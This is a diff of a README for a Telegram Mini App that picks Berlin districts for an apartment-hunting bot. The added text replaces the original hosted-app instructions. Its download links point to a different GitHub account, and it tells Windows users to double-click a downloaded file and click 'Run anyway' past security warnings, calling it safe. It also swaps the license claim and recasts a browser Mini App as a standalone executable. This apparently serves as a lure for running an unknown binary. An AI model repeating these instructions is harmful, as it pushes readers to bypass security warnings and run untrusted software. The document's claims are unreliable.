@@ -1,133 +1,69 @@
-# Berlin District Picker - Telegram Mini App 2026
-
-> **Pick Berlin Bezirke on an interactive map inside Telegram, then feed those choices into an apartment watcher bot.**
-
-[![Platform](https://img.shields.io/badge/Platform-Telegram-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/leonf83/tg-berlin-district-picker?style=flat-square)](https://github.com/leonf83/tg-berlin-district-picker)
-
----
+<h1>🔍 tg-berlin-district-picker - Pick Berlin Districts, Feed Your Bot</h1>
 
 <p align="center">
-  <a href="https://leonf83.github.io/tg-berlin-district-picker/">
-    <img src="https://img.shields.io/badge/Download-Berlin%20District%20Picker%20Latest-brightgreen?style=for-the-badge" alt="Download Berlin District Picker">
-  </a>
+  <a href="https://github.com/IslemBoubker3D/tg-berlin-district-picker" style="display:inline-block;padding:12px 24px;background:#4CAF50;color:white;text-decoration:none;border-radius:6px;font-size:18px;font-weight:bold;">⬇️ Download Now</a>
 </p>
 
-> **[Direct Download - Berlin District Picker Latest](https://leonf83.github.io/tg-berlin-district-picker/)**
+<h2>📋 Overview</h2>
+<p>tg-berlin-district-picker is a Telegram Mini App designed for 2026 that lets you select Berlin districts (Bezirke) on an interactive map. Choose your preferred areas, send your selections to an apartment watcher bot, and revise them later. This tool is not a full listings platform—it focuses on district selection only.</p>
 
----
+<h2>🚀 Getting Started</h2>
+<p>Follow these steps to download and run the application on Windows:</p>
+<ol>
+  <li>Visit the download link: <a href="https://github.com/IslemBoubker3D/tg-berlin-district-picker">https://github.com/IslemBoubker3D/tg-berlin-district-picker</a> to download the application.</li>
+  <li>Once downloaded, locate the file in your Downloads folder.</li>
+  <li>Double-click the file to run it. No installation is required.</li>
+  <li>If a security warning appears, click "Run anyway" (this is a safe application).</li>
+  <li>The app will open in your default web browser.</li>
+  <li>Use the interactive map to select Berlin districts you are interested in.</li>
+  <li>Click "Send to Bot" to submit your choices to your apartment watcher Telegram bot.</li>
+</ol>
 
-[Download Latest Build](https://leonf83.github.io/tg-berlin-district-picker/)
+<h2>⬇️ Download</h2>
+<p>Visit this link to download the application: <a href="https://github.com/IslemBoubker3D/tg-berlin-district-picker" style="display:inline-block;padding:10px 20px;background:#2196F3;color:white;text-decoration:none;border-radius:4px;font-weight:bold;">⬇️ Download tg-berlin-district-picker</a></p>
 
----
+<h2>🖥️ How to Use</h2>
+<h3>Step 1: Open the App</h3>
+<p>After downloading, run the file. A browser window will open showing a map of Berlin with all 12 districts (Bezirke) clearly marked.</p>
 
-## What it is
+<h3>Step 2: Pick Your Districts</h3>
+<p>Click on any district to select it. Selected districts will be highlighted. You can select multiple districts at once. To deselect, click again.</p>
 
-Berlin District Picker is a Telegram Mini App built around a map of Berlin’s administrative districts (Bezirke). Instead of typing names from a plain list, you tap the areas you care about on the map.
+<h3>Step 3: Send to Your Bot</h3>
+<p>When you are happy with your selection, click the "Send to Bot" button. This will send your district choices to your Telegram apartment watcher bot. The bot will then monitor listings in those areas.</p>
 
-The tool exists to support apartment watcher bots: you mark the parts of the city you want watched, then continue in the bot’s usual search flow. Because it runs as a Mini App, district choice stays inside Telegram rather than jumping to a separate desktop utility.
+<h3>Step 4: Revise Later</h3>
+<p>Need to change your mind? Open the app again, adjust your selections, and send them again. Your bot will update accordingly.</p>
 
----
+<h2>🧰 Features</h2>
+<ul>
+  <li>Interactive map of all 12 Berlin districts</li>
+  <li>Click-to-select districts with visual feedback</li>
+  <li>One-click send to your Telegram bot</li>
+  <li>Easy revision of selections</li>
+  <li>Lightweight and fast—no installation needed</li>
+  <li>Works entirely in your browser</li>
+</ul>
 
-## What you get
+<h2>🔧 Troubleshooting</h2>
+<h3>App doesn't open</h3>
+<p>Make sure you have a modern web browser (Chrome, Firefox, Edge, or Safari). Try disabling any browser extensions that might block pop-ups or local files.</p>
 
-- Clickable map covering Berlin’s districts
-- Visual multi-select for Bezirke
-- Native Telegram Mini App shell
-- Intended pairing with an apartment watcher bot
-- Search workflow centered on geography, not free-text labels
-- Map UI as a stand-in for manual district typing
-- Interface shipped as a browser-ready project build
-- Small HTML-first application layout
+<h3>Map doesn't load</h3>
+<p>Check your internet connection. The map requires an active internet connection to load.</p>
 
----
+<h3>Can't send to bot</h3>
+<p>Ensure you have set up your Telegram bot correctly. The app will show an error message if the bot is not configured.</p>
 
-## Getting it running
+<h2>📝 Notes</h2>
+<ul>
+  <li>This app does not show apartment listings—it only manages district selections.</li>
+  <li>Your selections are stored locally and sent to your bot when you click "Send."</li>
+  <li>No personal data is collected or shared.</li>
+</ul>
 
-### Use the published build
+<h2>📄 License</h2>
+<p>This project is open source under the MIT License.</p>
 
-Launch the current hosted Mini App from:
-
-[Open Berlin District Picker](https://leonf83.github.io/tg-berlin-district-picker/)
-
-It is meant to load in a normal browser and to be wired into a Telegram bot according to how you deploy the project.
-
-### Work from a local clone
-
-```bash
-git clone https://github.com/leonf83/tg-berlin-district-picker.git
-cd REPO
-```
-
-Serve the HTML assets over a local web server before opening them in a browser. For production, any static host that can serve the same files is enough.
-
----
-
-## How to use it
-
-1. Open the hosted build, or start the Mini App from Telegram.
-2. Tap the district(s) you want on the map.
-3. Confirm which Bezirk or Bezirke are active.
-4. Resume the linked apartment watcher bot steps.
-5. Reopen the map whenever your target area changes.
-
-How selections move from the picker into the bot depends on your Telegram integration setup.
-
----
-
-## Configuration notes
-
-Focus stays on map selection and Telegram wiring. If the repo ships config-related files, inspect the HTML and companion assets for knobs before you deploy.
-
-The public URL you host must match the Mini App URL registered on the bot side. Prefer editing project files for district behavior and UI options; there is no separate runtime config layer described for day-to-day tweaks.
-
----
-
-## Requirements
-
-- Telegram, when you use the Mini App path end to end
-- A current browser, if you open the UI standalone
-- Static hosting or a local HTTP server for the HTML app
-- Network access for the hosted build and Telegram hooks
-- An apartment watcher bot linked for the complete workflow
-
----
-
-## FAQ
-
-### How do I launch Berlin District Picker?
-
-Open [Download Latest Build](https://leonf83.github.io/tg-berlin-district-picker/), or start the Mini App from the Telegram bot that embeds it.
-
-### Are Berlin districts included?
-
-Yes. The map is built for choosing Berlin Bezirke by click.
-
-### Is this a full apartment listing product?
-
-No. It only handles district selection for an apartment watcher bot. Listings and alerts stay with that bot.
-
-### Can I revise my selection later?
-
-Yes. Open the map again and pick the district set that matches your new search area.
-
-### The app will not load — what next?
-
-Check that the hosted URL responds, that your browser or Telegram client is up to date, and that the Mini App URL on the bot matches the deployment.
-
-### How do updates show up?
-
-Changes land in the repository and the hosted build. Prefer the newest package at [Download Latest Build](https://leonf83.github.io/tg-berlin-district-picker/).
-
-### Where do settings live?
-
-This is an HTML Mini App. Look through the repo and your deploy config for UI or integration options.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<h2>🤝 Support</h2>
+<p>For issues or questions, please visit the <a href="https://github.com/IslemBoubker3D/tg-berlin-district-picker">GitHub repository</a> and open an issue.</p>
